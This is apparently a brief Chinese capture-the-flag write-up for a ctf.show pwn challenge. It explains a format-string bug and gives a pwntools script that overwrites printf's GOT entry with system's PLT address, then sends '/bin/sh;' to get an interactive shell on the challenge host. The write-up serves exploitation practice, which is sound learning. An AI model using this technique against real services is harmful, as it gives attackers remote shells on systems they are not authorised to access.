# 挑战简介
好了，你已经学会1+1=2了，接下来继续加油吧

# 思路
简单的格式化字符串应用  

简单应用got,plt表,把printf的got改成system即可  

```
from pwn import *
from LibcSearcher import *
#context(arch = "amd64",os = 'linux',log_level = 'debug')

context(arch = "i386",os = 'linux',log_level = 'debug')

#io = process("./pwn")

io = remote('pwn.challenge.ctf.show',28194)

elf = ELF('D:\edge 下载\pwn')

print_got = elf.got['printf']
sys.plt = elf.plt['system']

offset = 6

payload = fmtstr_payload(offset, {print_got: sys.plt})

io.sendline(payload)

io.send("/bin/sh;")
io.interactive()
```
